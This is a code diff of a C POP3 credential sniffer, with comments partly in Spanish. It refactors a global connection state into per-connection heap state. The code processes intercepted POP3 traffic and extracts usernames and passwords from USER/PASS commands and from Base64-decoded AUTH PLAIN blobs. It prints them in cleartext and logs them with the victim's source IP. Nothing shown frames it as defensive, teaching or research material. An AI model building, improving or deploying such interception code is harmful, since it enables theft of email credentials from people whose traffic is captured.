@@ -5,21 +5,6 @@
 #include <ctype.h>
 #include <time.h>
 
-// Structure to hold state for each connection
-typedef struct {
-    char user[256];
-    char pass[256];
-    char buffer[1024];
-    size_t buffer_len;
-    int user_found;
-    int pass_found;
-
-    // Para AUTH PLAIN (SASL)
-    int waiting_auth_plain_blob;   // vimos "AUTH PLAIN" y esperamos la línea Base64
-} pop3_state_t;
-
-static pop3_state_t pop3_state = {0};
-
 // =================== Helpers generales ===================
 
 // Helper function to trim whitespace and newlines
@@ -160,26 +145,39 @@ static void log_credentials(const char* username, const char* password, const ch
 
 // =================== API ===================
 
-void pop3_sniffer_reset(void) {
-    memset(&pop3_state, 0, sizeof(pop3_state));
+pop3_state_t *pop3_sniffer_init(void) {
+    pop3_state_t *state = (pop3_state_t *)calloc(1, sizeof(pop3_state_t));
+    return state;
+}
+
+void pop3_sniffer_destroy(pop3_state_t *state) {
+    if (state != NULL) {
+        free(state);
+    }
+}
+
+void pop3_sniffer_reset(pop3_state_t *state) {
+    if (state != NULL) {
+        memset(state, 0, sizeof(*state));
+    }
 }
 
 // Procesa datos interceptados en una conexión hacia un servidor POP3
-void pop3_sniffer_process(const uint8_t *data, size_t len, const char *ip_origen) {
-    if (len == 0 || data == NULL) return;
+void pop3_sniffer_process(pop3_state_t *state, const uint8_t *data, size_t len, const char *ip_origen) {
+    if (state == NULL || len == 0 || data == NULL) return;
 
     // Add data to buffer
-    if (pop3_state.buffer_len + len >= sizeof(pop3_state.buffer)) {
+    if (state->buffer_len + len >= sizeof(state->buffer)) {
         // Buffer overflow, reset
-        pop3_state.buffer_len = 0;
+        state->buffer_len = 0;
     }
 
-    memcpy(pop3_state.buffer + pop3_state.buffer_len, data, len);
-    pop3_state.buffer_len += len;
-    pop3_state.buffer[pop3_state.buffer_len] = '\0';
+    memcpy(state->buffer + state->buffer_len, data, len);
+    state->buffer_len += len;
+    state->buffer[state->buffer_len] = '\0';
 
     // Process complete lines
-    char* line_start = pop3_state.buffer;
+    char* line_start = state->buffer;
     char* line_end;
 
     while ((line_end = strchr(line_start, '\n')) != NULL) {
@@ -197,33 +195,33 @@ void pop3_sniffer_process(const uint8_t *data, size_t len, const char *ip_origen
             }
 
             // 1) USER/PASS clásicos
-            if (strncmp(upper_line, "USER ", 5) == 0 && !pop3_state.user_found) {
+            if (strncmp(upper_line, "USER ", 5) == 0 && !state->user_found) {
                 char* username = extract_value(trimmed_line, "USER");
                 if (username) {
-                    strncpy(pop3_state.user, username, sizeof(pop3_state.user) - 1);
-                    pop3_state.user[sizeof(pop3_state.user) - 1] = '\0';
-                    pop3_state.user_found = 1;
-                    printf("[POP3 SNIFFER] Found USER: %s\n", pop3_state.user);
+                    strncpy(state->user, username, sizeof(state->user) - 1);
+                    state->user[sizeof(state->user) - 1] = '\0';
+                    state->user_found = 1;
+                    printf("[POP3 SNIFFER] Found USER: %s\n", state->user);
                     free(username);
                 }
             }
-            else if (strncmp(upper_line, "PASS ", 5) == 0 && !pop3_state.pass_found) {
+            else if (strncmp(upper_line, "PASS ", 5) == 0 && !state->pass_found) {
                 char* password = extract_value(trimmed_line, "PASS");
                 if (password) {
-                    strncpy(pop3_state.pass, password, sizeof(pop3_state.pass) - 1);
-                    pop3_state.pass[sizeof(pop3_state.pass) - 1] = '\0';
-                    pop3_state.pass_found = 1;
-                    printf("[POP3 SNIFFER] Found PASS: %s\n", pop3_state.pass);
+                    strncpy(state->pass, password, sizeof(state->pass) - 1);
+                    state->pass[sizeof(state->pass) - 1] = '\0';
+                    state->pass_found = 1;
+                    printf("[POP3 SNIFFER] Found PASS: %s\n", state->pass);
                     free(password);
                 }
             }
             // 2) AUTH PLAIN (SASL) → siguiente línea es Base64
             else if (strncmp(upper_line, "AUTH PLAIN", 10) == 0) {
-                pop3_state.waiting_auth_plain_blob = 1;
+                state->waiting_auth_plain_blob = 1;
                 printf("[POP3 SNIFFER] Detected AUTH PLAIN, waiting for Base64 blob...\n");
             }
             // 3) Si estamos esperando el blob Base64 de AUTH PLAIN
-            else if (pop3_state.waiting_auth_plain_blob) {
+            else if (state->waiting_auth_plain_blob) {
                 unsigned char decoded[512];
                 int decoded_len = base64_decode(trimmed_line, decoded, sizeof(decoded));
                 if (decoded_len > 0) {
@@ -249,19 +247,19 @@ void pop3_sniffer_process(const uint8_t *data, size_t len, const char *ip_origen
                         int pass_len = idx - start_pass;
 
                         if (user_len > 0 && pass_len > 0) {
-                            if (!pop3_state.user_found) {
-                                int copy_len = user_len < (int)sizeof(pop3_state.user) - 1 ? user_len : (int)sizeof(pop3_state.user) - 1;
-                                memcpy(pop3_state.user, &decoded[start_user], copy_len);
-                                pop3_state.user[copy_len] = '\0';
-                                pop3_state.user_found = 1;
-                                printf("[POP3 SNIFFER] AUTH PLAIN USER: %s\n", pop3_state.user);
+                            if (!state->user_found) {
+                                int copy_len = user_len < (int)sizeof(state->user) - 1 ? user_len : (int)sizeof(state->user) - 1;
+                                memcpy(state->user, &decoded[start_user], copy_len);
+                                state->user[copy_len] = '\0';
+                                state->user_found = 1;
+                                printf("[POP3 SNIFFER] AUTH PLAIN USER: %s\n", state->user);
                             }
-                            if (!pop3_state.pass_found) {
-                                int copy_len = pass_len < (int)sizeof(pop3_state.pass) - 1 ? pass_len : (int)sizeof(pop3_state.pass) - 1;
-                                memcpy(pop3_state.pass, &decoded[start_pass], copy_len);
-                                pop3_state.pass[copy_len] = '\0';
-                                pop3_state.pass_found = 1;
-                                printf("[POP3 SNIFFER] AUTH PLAIN PASS: %s\n", pop3_state.pass);
+                            if (!state->pass_found) {
+                                int copy_len = pass_len < (int)sizeof(state->pass) - 1 ? pass_len : (int)sizeof(state->pass) - 1;
+                                memcpy(state->pass, &decoded[start_pass], copy_len);
+                                state->pass[copy_len] = '\0';
+                                state->pass_found = 1;
+                                printf("[POP3 SNIFFER] AUTH PLAIN PASS: %s\n", state->pass);
                             }
                         } else {
                             printf("[POP3 SNIFFER] AUTH PLAIN decoded but user/pass empty\n");
@@ -271,7 +269,7 @@ void pop3_sniffer_process(const uint8_t *data, size_t len, const char *ip_origen
                     printf("[POP3 SNIFFER] Failed to decode AUTH PLAIN Base64: '%s'\n", trimmed_line);
                 }
 
-                pop3_state.waiting_auth_plain_blob = 0;
+                state->waiting_auth_plain_blob = 0;
             }
         }
 
@@ -279,23 +277,23 @@ void pop3_sniffer_process(const uint8_t *data, size_t len, const char *ip_origen
     }
 
     // Si tenemos user y pass, los logueamos
-    if (pop3_state.user_found && pop3_state.pass_found) {
-        log_credentials(pop3_state.user, pop3_state.pass, ip_origen);
+    if (state->user_found && state->pass_found) {
+        log_credentials(state->user, state->pass, ip_origen);
 
         // Reset state for next credentials (misma conexión o futura)
-        pop3_state.user_found = 0;
-        pop3_state.pass_found = 0;
-        memset(pop3_state.user, 0, sizeof(pop3_state.user));
-        memset(pop3_state.pass, 0, sizeof(pop3_state.pass));
+        state->user_found = 0;
+        state->pass_found = 0;
+        memset(state->user, 0, sizeof(state->user));
+        memset(state->pass, 0, sizeof(state->pass));
     }
 
     // Move remaining data to beginning of buffer
-    if (line_start < pop3_state.buffer + pop3_state.buffer_len) {
-        size_t remaining = (size_t)(pop3_state.buffer + pop3_state.buffer_len - line_start);
-        memmove(pop3_state.buffer, line_start, remaining);
-        pop3_state.buffer_len = remaining;
-        pop3_state.buffer[pop3_state.buffer_len] = '\0';
+    if (line_start < state->buffer + state->buffer_len) {
+        size_t remaining = (size_t)(state->buffer + state->buffer_len - line_start);
+        memmove(state->buffer, line_start, remaining);
+        state->buffer_len = remaining;
+        state->buffer[state->buffer_len] = '\0';
     } else {
-        pop3_state.buffer_len = 0;
+        state->buffer_len = 0;
     }
 }
